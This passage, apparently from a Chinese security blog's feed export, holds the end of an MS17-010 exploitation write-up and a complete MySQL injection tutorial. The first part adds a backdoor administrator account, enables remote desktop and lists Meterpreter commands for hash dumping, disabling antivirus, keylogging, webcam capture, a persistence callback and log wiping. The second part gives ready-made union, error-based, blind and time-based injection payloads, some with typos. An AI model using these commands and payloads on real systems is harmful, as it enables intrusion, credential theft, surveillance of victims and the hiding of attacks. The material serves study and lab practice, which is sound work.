<p>攻击成功，进入后渗透攻击阶段</p>
<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" alt="image-20210809161712134" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" class="lozad post-image"></p>
<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
<pre class="highlight"><span class="line">sysinfo</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" alt="image-20210809161720244" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" class="lozad post-image"></p>
<p>b、查看当前获取的权限</p>
<pre class="highlight"><span class="line">getuid</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" alt="image-20210809161730216" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" class="lozad post-image"></p>
<p>system权限，无需提权</p>
<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>

<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" alt="image-20210809161744651" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" class="lozad post-image"></p>
<p>成功开启远程桌面</p>
<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" alt="image-20210809161756295" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" class="lozad post-image"></p>
<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" alt="image-20210809161805432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" alt="image-20210809161814628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" class="lozad post-image"></p>
<p>提权成功</p>
<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" alt="image-20210809161826717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" class="lozad post-image"></p>
<p>b、成功连接至靶机</p>
<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" alt="image-20210809161839547" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" class="lozad post-image"></p>
<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
<p>附录</p>
<pre class="highlight"><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line"></span><br><span class="line">clearev                       							#清除日志</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>MS17-010</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql注入</title>
    <url>/article/Mysql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>端口：3306</p>
<h1 id="一、SQL注入产生原因"><a href="#一、SQL注入产生原因" class="headerlink" title="一、SQL注入产生原因"></a>一、SQL注入产生原因</h1><p>1、不当的类型处理</p>
<p>2、不安全的数据库配置</p>
<p>3、不合理的查询集处理</p>
<p>4、不当的错误处理</p>
<p>5、转义字符处理不合适</p>
<p>6、多个提交处理不当</p>
<h1 id="二、SQL注入关键条件"><a href="#二、SQL注入关键条件" class="headerlink" title="二、SQL注入关键条件"></a>二、SQL注入关键条件</h1><p>1、用户能控制输入的内容</p>
<p>2、Web应用能把用户输入的内容带入到数据库中执行</p>
<p>SQL注入分类</p>
<table>
<thead>
<tr>
<th align="left">分类</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">根据请求方式分类 （判断注入工具：Burpsuite等）</td>
<td align="left">GET方式请求注入 POST方式请求注入</td>
</tr>
<tr>
<td align="left">根据注入点参数分类 （判断手法：’、”、\）</td>
<td align="left">字符型注入 整数型注入 搜索型注入（%’and ‘%’=’ 闭合%）</td>
</tr>
<tr>
<td align="left">根据SQL注入点反馈类型分类（重点） （判断注入payload）</td>
<td align="left">union类型 基于错误显示 布尔类型 基于时间 其他类型</td>
</tr>
<tr>
<td align="left">根据Web应用的数据库类型分类 （判断注入语句）</td>
<td align="left">MySQL SQLServer Oracle Access</td>
</tr>
</tbody></table>
<p>基于反馈类型分类注入流程</p>
<table>
<thead>
<tr>
<th align="left">方式</th>
<th align="left">选择条件</th>
</tr>
</thead>
<tbody><tr>
<td align="left">union联合查询</td>
<td align="left">有显示位</td>
</tr>
<tr>
<td align="left">报错注入</td>
<td align="left">mysql_error调试未删除，控制报错信息</td>
</tr>
<tr>
<td align="left">bool盲注</td>
<td align="left">页面没显示位、不报错，只能通过页面是否正常来判断，通常为登录页面</td>
</tr>
<tr>
<td align="left">时间延时盲注</td>
<td align="left">页面没显示位、不报错，页面都显示正常，只能通过页面响应时间判断</td>
</tr>
</tbody></table>
<p><strong>万能密码</strong></p>
<pre class="highlight"><span class="line">admin&#x27; or 1=&#x27;1</span><br></pre>

<p>语境</p>
<pre class="highlight"><span class="line">select * from name = &#x27;admin&#x27; or 1=&#x27;1&#x27; and pass=&#x27;&#x27;;</span><br></pre>

<p>关键：</p>
<p>使用or进行逻辑判断，构造true语句，使得整个判断语句为true</p>
<h1 id="三、手工注入流程"><a href="#三、手工注入流程" class="headerlink" title="三、手工注入流程"></a>三、手工注入流程</h1><p>1、判断换是否有注入漏洞，识别注入点类型</p>
<p>2、获取数据库中的信息</p>
<p> 获取数据库基本信息（数据库版本、数据库类型、查询列数等）</p>
<p> 获取数据库库名</p>
<p> 获取表名</p>
<p> 获取列名</p>
<p> 获取用户数据</p>
<p>3、破解加密数据（数据解密）</p>
<p>4、提升权限（配合其他漏洞）</p>
<p>5、内网渗透（配合其他漏洞）</p>
<h1 id="四、详细过程"><a href="#四、详细过程" class="headerlink" title="四、详细过程"></a>四、详细过程</h1><h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><h3 id="1、判断是否存在注入漏洞"><a href="#1、判断是否存在注入漏洞" class="headerlink" title="1、判断是否存在注入漏洞"></a>1、判断是否存在注入漏洞</h3><p>（需要结合数据情景，判断可能使用的sql语句）</p>
<p>找与数据库交互的位置，判断动态参数，需要结合burpsuite抓包</p>
<p>1、参数后加 <code>&#39; &quot; \</code>（全加），判断页面是否异常（\必出异常，不用做后续判断）</p>
<p>2、若出现异常，则依次尝试修改判断字符，使页面返回正常。返回正常则为字符型注入。</p>
<p>&gt;&gt;若均未返回正常页面，则尝试2-1(若原数据为1)判断是否为整数型注入。（正常则为整数型注入）</p>
<p>3、使用使页面报错的字符，后加#（url中需url编码为%23）；若正常则只有该截断字符，不正常继续判断其他截断字符。</p>
<p>&gt;&gt;再加)#；正常则含有括号，不正常则进行嵌套判断。</p>
<p>4、以上均没有，则判断特殊注入。二次编码注入、宽字节注入、时间延时盲注等（这些类型注入，使用单双信号页面无变化）。</p>
<h3 id="2、判断数据库列数"><a href="#2、判断数据库列数" class="headerlink" title="2、判断数据库列数"></a>2、判断数据库列数</h3><p>order by + 数字</p>
<p>报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。</p>
<p><code>&#39; order by 5#</code></p>
<p>修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。</p>
<p>然后使用union select联合查,寻找显示位：</p>
<p><code>id = -2 union select 1,2,3,4；</code></p>
<h3 id="3、数据库信息查询"><a href="#3、数据库信息查询" class="headerlink" title="3、数据库信息查询"></a>3、数据库信息查询</h3><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">查库名</td>
<td align="left"><code>-1 union select 1,2,database()-- a</code> 推荐 <br><code>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</code></td>
</tr>
<tr>
<td align="left">查表名</td>
<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;数据库名&#39;)-- a</code></td>
</tr>
<tr>
<td align="left">查列名</td>
<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;)-- a</code></td>
</tr>
<tr>
<td align="left">查数据</td>
<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)-- a</code></td>
</tr>
</tbody></table>
<p><strong>注意</strong>：</p>
<p>1、union select查询列数要与前面列数相同</p>
<p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
<p>如</p>
<pre class="highlight"><span class="line">SELECT * FROM db_bbs.tb_user UNION SELECT 1,(SELECT group_concat(table_name,&#x27;|&#x27;)FROM information_schema.`TABLES` WHERE TABLES_schema=&#x27;db_bbs&#x27;;),3,4;</span><br></pre>

<p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
<p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
<p>即</p>
<pre class="highlight"><span class="line">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()</span><br></pre>



<p><strong>数据库常用函数</strong></p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">version()</td>
<td align="left">数据库版本号</td>
</tr>
<tr>
<td align="left">database()</td>
<td align="left">当前数据库</td>
</tr>
<tr>
<td align="left">user()</td>
<td align="left">当前用户</td>
</tr>
<tr>
<td align="left">current_user()</td>
<td align="left">当前用户名</td>
</tr>
<tr>
<td align="left">system_user()</td>
<td align="left">系统用户名</td>
</tr>
<tr>
<td align="left">@@datadir</td>
<td align="left">数据库路径</td>
</tr>
<tr>
<td align="left">@@version_compile_os</td>
<td align="left">操作系统版本</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">常用函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">limit</td>
<td align="left">限制查询数量，下标从0开始 limit 0,1 从0开始查两个</td>
</tr>
<tr>
<td align="left">length()</td>
<td align="left">计算数据长度</td>
</tr>
<tr>
<td align="left">count()</td>
<td align="left">计算数据行数</td>
</tr>
<tr>
<td align="left">mid(str,1,30)</td>
<td align="left">截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名</td>
</tr>
<tr>
<td align="left">substr(str,0,30)</td>
<td align="left">0为截取初始位，包含整个查询语句</td>
</tr>
<tr>
<td align="left">ascii()</td>
<td align="left">转为ascii码</td>
</tr>
</tbody></table>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1、相关函数"><a href="#1、相关函数" class="headerlink" title="1、相关函数"></a>1、相关函数</h3><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">updatexml(arg1,arg2,arg3) <br>查询符合条件的数据 XPATH路径报错</td>
<td align="left">and updatexml(1,concat(0x5e,(select user()),0x5e),1)  <br>mysql5.1.5及以上版本，输出有32位长度限制 0x5e为^的16进制编码，用于绕过斜杠转义，下同</td>
</tr>
<tr>
<td align="left">extractvalue(arg1,arg2) <br>同上，两个参数 XPATH路径报错</td>
<td align="left">and extractvalue(1,concat(0x5e,(select user()),0x5e))  <br>mysql5.1及以上版本,输出有32位长度限制</td>
</tr>
<tr>
<td align="left">floor() <br>返回小于等于该值的最大整数（只返回整数部分） floor、count、group by函数冲突报错</td>
<td align="left">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)  <br>mysql5.0及以上版本，user()可变，其他固定</td>
</tr>
<tr>
<td align="left">name_const(name,value) <br>产生一个结果集合列 列名重复报错</td>
<td align="left">and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a  <br>mysql5.0及以下</td>
</tr>
<tr>
<td align="left">exp() 以e为底的指数函数 整形溢出报错</td>
<td align="left">and exp(~(select * from (select user()) a))  <br>mysql5.5.5及以上版本</td>
</tr>
<tr>
<td align="left">几何函数报错（不满足要求就会报错） <br>geometrycollection() <br>multipoint() <br>polygon() <br>multipolygon() <br>linestring() <br>multilinestring()</td>
<td align="left">and multipoint((select * from (select * from (select * from (select version())a)b)c))</td>
</tr>
</tbody></table>
<h3 id="2、用法："><a href="#2、用法：" class="headerlink" title="2、用法："></a>2、用法：</h3><p>将对应user()等地方替换为要执行的sql语句即可</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">查数据库名</td>
<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- a</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)-- a</code></td>
</tr>
<tr>
<td align="left">查表名</td>
<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)-- a</code></td>
</tr>
<tr>
<td align="left">查列名</td>
<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)-- a</code></td>
</tr>
<tr>
<td align="left">查数据</td>
<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)-- a</code></td>
</tr>
</tbody></table>
<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
<p>1、用法：</p>
<p>ascii码二分法</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">先判断数据长度或个数</td>
<td align="left">and length((select database())) &gt; 64</td>
</tr>
<tr>
<td align="left">然后进行二分法匹配</td>
<td align="left">and ascii(mid((select database()),1,1)) &gt;64</td>
</tr>
</tbody></table>
<p>2、语句（省略二分法，直接用=号）</p>
<p>n均为前一句获取的长度值</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">获取数据库长度</td>
<td align="left"><code>and (length(database()))=8</code> <br>注意：判断长度不需要转ascii码</td>
</tr>
<tr>
<td align="left">获取数据库名</td>
<td align="left"><code>and ascii((select mid(database(),1,1)))=115 -- a</code></td>
</tr>
<tr>
<td align="left">获取表长度</td>
<td align="left"><code>and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30 -- a</code></td>
</tr>
<tr>
<td align="left">获取表名</td>
<td align="left"><code>and ascii((select mid(group_conca(table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</code></td>
</tr>
<tr>
<td align="left">获取列长度</td>
<td align="left"><code>and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
</tr>
<tr>
<td align="left">获取列名</td>
<td align="left"><code>and ascii((select mid(group_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
</tr>
<tr>
<td align="left">获取数据长度</td>
<td align="left"><code>and length((select group_concat(username) from database().&#39;表名&#39;))=30 -- a</code></td>
</tr>
<tr>
<td align="left">获取数据</td>
<td align="left"><code>and ascii((select mid((username,password),1,1) from database().&#39;表名&#39;))=30 -- a</code></td>
</tr>
</tbody></table>
<h3 id="时间延时盲注"><a href="#时间延时盲注" class="headerlink" title="时间延时盲注"></a>时间延时盲注</h3><p>（单双引号页面无变化）</p>
<p>基于sql盲注，为升级版本</p>
<p>使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注</p>
<p>1、判断：</p>
<p><code>&#39; &quot; \</code></p>
<p><code>&#39;and sleep(3) %23</code></p>
<p><code>&#39; and sleep(3))%23</code></p>
<p>…</p>
<p>方法同判断截断字符</p>
<p>2、用法：</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">if</td>
<td align="left">select if(arg1,arg2,arg3) <br>arg1：判断条件 <br>arg2：条件为真时执行的语句 <br>arg3：条件为假时执行的语句  <br>常用： <br>and select if((length(database())&gt;5),sleep(5),1) –a</td>
</tr>
<tr>
<td align="left">case when</td>
<td align="left">select case when arg1 then arg2 else arg3 end; <br>arg1：判断条件 <br>arg2：条件为真时执行的语句<br>arg3：条件为假时执行的语句  <br>常用： <br>and select case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a</td>
</tr>
</tbody></table>
<p>3、语句如下（省略二分法，直接用=号）</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">获取数据库长度</td>
<td align="left"><code>and if((length(database()))=8),sleep(3),1)-- a</code> <br>注意：判断长度不需要转ascii码</td>
</tr>
<tr>
<td align="left">获取数据库名</td>
<td align="left"><code>and if((ascii((select mid(database(),1,1)))=115),sleep(3),1) -- a</code></td>
</tr>
<tr>
<td align="left">获取表长度</td>
<td align="left"><code>and if((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30),sleep(3),1) -- a</code></td>
</tr>
<tr>
<td align="left">获取表名</td>
<td align="left"><code>and if((ascii((select mid(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))=100),sleep(3),1) -- a</code></td>
</tr>
<tr>
<td align="left">获取列长度</td>
<td align="left"><code>and if((length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
</tr>
<tr>
<td align="left">获取列名</td>
<td align="left"><code>and if((ascii((select mid(goup_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
</tr>
<tr>
<td align="left">获取数据长度</td>
<td align="left"><code>and if((length((select group_concat(username) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
</tr>
<tr>
<td align="left">获取字段名</td>
<td align="left"><code>and if((ascii((select mid(goup_concat(username),1,1) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
</tr>
</tbody></table>
<p>注： sleep可用benchmark代替</p>
<p><code>benchmark(arg1,arg2)</code></p>
<p>arg1为执行次数，arg2为执行语句</p>
<p>即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定</p>
<p>benchmark(5000000,md5(123)) 执行500万次MD5加密</p>
<p>select if(判断语句,benchmark(5000000,md5(123)),1)</p>
<h1 id="五、其他注入类型"><a href="#五、其他注入类型" class="headerlink" title="五、其他注入类型"></a>五、其他注入类型</h1><h2 id="1、请求头注入"><a href="#1、请求头注入" class="headerlink" title="1、请求头注入"></a>1、请求头注入</h2><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">User-Agent</td>
<td align="left">浏览器版本</td>
</tr>
<tr>
<td align="left">X-Forwarded-For</td>
<td align="left">获取HTTP请求端的真实IP</td>
</tr>
</tbody></table>
<p>使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可</p>
<p>注意，这里的sql语句大概率为insert，所以可用注入为：</p>
<p>报错注入和bool盲注</p>
<h3 id="2、内联注入"><a href="#2、内联注入" class="headerlink" title="2、内联注入"></a>2、内联注入</h3><p>留言板界面若是存在注入，可用补齐insert语句参数法，</p>
<p>找到留言板的显示位，在显示位上进行sql注入。</p>
<p>这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。</p>
<p>使用</p>
<p>不用注释，用截断代替，然后使用多个and/or连接</p>
<p>注：前面为true用and；前面为false用or</p>
<p>1、<code>&#39;firefox&#39; and &#39;</code>补齐</p>
<p>2、<code>&#39;firefox&#39; and payload and &#39;</code></p>
<h3 id="3、宽字节注入"><a href="#3、宽字节注入" class="headerlink" title="3、宽字节注入"></a>3、宽字节注入</h3><p>（单双引号页面无变化）</p>
<p>mysql语句执行时，现将数据转成16进制，再执行</p>
<p>GBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）</p>
<p>ascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）</p>
<p>当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；</p>
<p>当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。</p>
<p>形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）</p>
<p>原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）</p>
<p>但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，</p>
<p>此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）</p>
<p><strong>用法：</strong></p>
<p>注意：通常出现在斜杠转义单双引号的网页</p>
<p>利用：构造?id=1%df’即可</p>
<p>%df可以为任何hex码在81-FE之间的数据</p>
<p><strong>宽字节注入存在条件</strong></p>
<p>PHP+Mysql+GBK</p>
<p><strong>编码语句：</strong></p>
<pre class="highlight"><span class="line">mysql_set_charset(&quot;gbk&quot;)</span><br><span class="line"></span><br><span class="line">mysql_query(&quot;set names gbk&quot;)</span><br></pre>

<p>转义语句：</p>
<pre class="highlight"><span class="line">addslashes(&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(&#x27;&#x27;)</span><br></pre>

<p>上述四条语句组合中，除了</p>
<p><code>mysql_set_charset(&quot;gbk&quot;)+mysql_real_escape_string(&#39;&#39;)</code>组合，其他组合均存在宽字节注入</p>
<h3 id="4、二次编码注入"><a href="#4、二次编码注入" class="headerlink" title="4、二次编码注入"></a>4、二次编码注入</h3><p>(单双引号页面无变化)</p>
<p>注！先转义再解码造成注入，应先解码再转义</p>
<table>
<thead>
<tr>
<th align="left">正确流程</th>
<th align="left">错误流程（二次编码注入）</th>
</tr>
</thead>
<tbody><tr>
<td align="left">php自动进行一次url解码 网站二次解码 转义单双引号进行防护 写入数据库</td>
<td align="left">php自动解码 转义防护 网站二次解码 urldecode()、rawurldecode() 写入数据库</td>
</tr>
</tbody></table>
<p>单引号二次url编码为：%2527</p>
<p>双引号二次url编码为：%2522</p>
<p>关键字二次编码：hex转码-前缀加%25（%的url编码）</p>
<h3 id="5、堆叠注入"><a href="#5、堆叠注入" class="headerlink" title="5、堆叠注入"></a>5、堆叠注入</h3><p>前提：存在sql注入</p>
<p>截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）</p>
<p>堆叠注入存在场景</p>
<table>
<thead>
<tr>
<th align="left">搭配</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">mssql+asp/php/jsp</td>
<td align="left">堆叠注入</td>
</tr>
<tr>
<td align="left">mysql+php</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">mysql_connect()/mysql_query(“select $id”)</td>
<td align="left">不能堆叠注入</td>
</tr>
<tr>
<td align="left">mysqli_connect()/mysqli_query(“select $id”)</td>
<td align="left">不能堆叠注入</td>
</tr>
<tr>
<td align="left">mysqli_connect()/multi_query(“select $id”)</td>
<td align="left">堆叠注入</td>
</tr>
<tr>
<td align="left">new PDO()/bindvalue(“select ?”) execute($id)</td>
<td align="left">不能注入</td>
</tr>
<tr>
<td align="left">new PDO()/query(“select $id”)</td>
<td align="left">堆叠注入</td>
</tr>
</tbody></table>
<h3 id="6、二阶注入"><a href="#6、二阶注入" class="headerlink" title="6、二阶注入"></a>6、二阶注入</h3><p>存储在数据库汇总的数据，在使用时发生的注入</p>
